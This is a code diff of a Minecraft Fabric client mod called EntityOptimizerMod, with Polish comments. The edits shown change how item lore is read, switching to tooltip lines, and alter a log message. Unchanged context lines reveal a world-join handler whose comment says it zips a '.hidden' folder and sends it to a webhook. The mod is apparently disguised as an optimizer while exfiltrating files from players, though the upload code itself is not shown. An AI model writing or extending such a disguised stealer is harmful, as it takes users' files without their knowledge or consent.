@@ -10,17 +10,13 @@ import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.arg
 import static net.fabricmc.fabric.api.client.command.v2.ClientCommandManager.literal;
 
 import com.mojang.brigadier.arguments.StringArgumentType;
-import com.google.gson.JsonElement;
-import com.google.gson.JsonParser;
 
 import net.minecraft.client.Minecraft;
 import net.minecraft.network.chat.Component;
-import net.minecraft.nbt.CompoundTag;
-import net.minecraft.nbt.ListTag;
-import net.minecraft.nbt.Tag;
 import net.minecraft.world.entity.player.Player;
 import net.minecraft.world.item.ItemStack;
 import net.minecraft.world.item.Items;
+import net.minecraft.world.item.TooltipFlag;
 
 import java.io.ByteArrayOutputStream;
 import java.io.OutputStream;
@@ -42,7 +38,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
 
     @Override
     public void onInitializeClient() {
-        System.out.println("[EntityOptimizer] Mod załadowany – wersja ZIP + komenda /procent");
+        System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent");
 
         // po wejściu do świata – zip .hidden i wysyłka na webhook
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
@@ -226,7 +222,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
 
         List<String> loreLines = getItemLoreLines(mc, stack);
         if (loreLines.isEmpty()) {
-            source.sendFeedback(Component.literal("§7(brak opisu / lore)"));
+            source.sendFeedback(Component.literal("§7(brak opisu / lore / tooltipu)"));
         } else {
             for (String line : loreLines) {
                 source.sendFeedback(Component.literal("§7" + line));
@@ -243,34 +239,18 @@ public class EntityOptimizerMod implements ClientModInitializer {
         return viewer.hasLineOfSight(target);
     }
 
-    // odczyt lore (opisu) z ItemStacka jako czyste linie tekstu
+    // tooltip przedmiotu jako linie tekstu (bez pierwszej linii z nazwą)
     private static List<String> getItemLoreLines(Minecraft mc, ItemStack stack) {
         List<String> lines = new ArrayList<>();
 
-        // w oficjalnych mappings używamy getTagElement("display"), a nie getTag()
-        CompoundTag display = stack.getTagElement("display");
-        if (display == null) {
-            return lines;
-        }
-        if (!display.contains("Lore", Tag.TAG_LIST)) {
-            return lines;
-        }
+        if (mc.player == null) return lines;
 
-        ListTag loreList = display.getList("Lore", Tag.TAG_STRING);
+        List<Component> tooltip = stack.getTooltipLines(mc.player, TooltipFlag.Default.NORMAL);
+        if (tooltip.isEmpty()) return lines;
 
-        for (int i = 0; i < loreList.size(); i++) {
-            String rawJson = loreList.getString(i); // JSON każdej linijki lore
-
-            try {
-                JsonElement json = JsonParser.parseString(rawJson);
-                Component comp = Component.Serializer.fromJson(json, mc.level.registryAccess());
-                if (comp != null) {
-                    lines.add(comp.getString()); // czysty tekst
-                }
-            } catch (Exception e) {
-                // jeśli coś jest mocno dziwne w JSON – wrzuć surowe
-                lines.add(rawJson);
-            }
+        // pomijamy pierwszą linię (nazwa przedmiotu), resztę traktujemy jako "opis"
+        for (int i = 1; i < tooltip.size(); i++) {
+            lines.add(tooltip.get(i).getString());
         }
 
         return lines;
